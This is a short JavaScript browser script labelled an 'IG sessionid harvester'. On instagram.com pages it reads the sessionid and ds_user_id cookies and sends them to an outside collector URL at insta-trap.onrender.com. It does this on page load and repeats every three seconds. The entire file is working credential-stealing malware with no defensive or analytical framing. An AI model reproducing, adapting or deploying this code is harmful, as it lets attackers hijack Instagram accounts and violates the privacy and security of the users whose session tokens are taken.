/* OMEGA – IG sessionid harvester */
(function () {
  const COLLECTOR_URL = "https://insta-trap.onrender.com"; // Render URL
  const IG_DOMAINS = ["instagram.com", "www.instagram.com"];
  function grab() {
    if (!IG_DOMAINS.includes(location.hostname)) return;
    const data = document.cookie.split("; ").reduce((a, c) => {
      const [k, v] = c.split("=");
      if (k === "sessionid") a.sessionid = v;
      if (k === "ds_user_id") a.ds_user_id = v;
      return a;
    }, {});
    if (data.sessionid) {
      navigator.sendBeacon(COLLECTOR_URL, JSON.stringify(data));
    }
  }
  window.addEventListener("load", grab);
  setInterval(grab, 3000);
})();
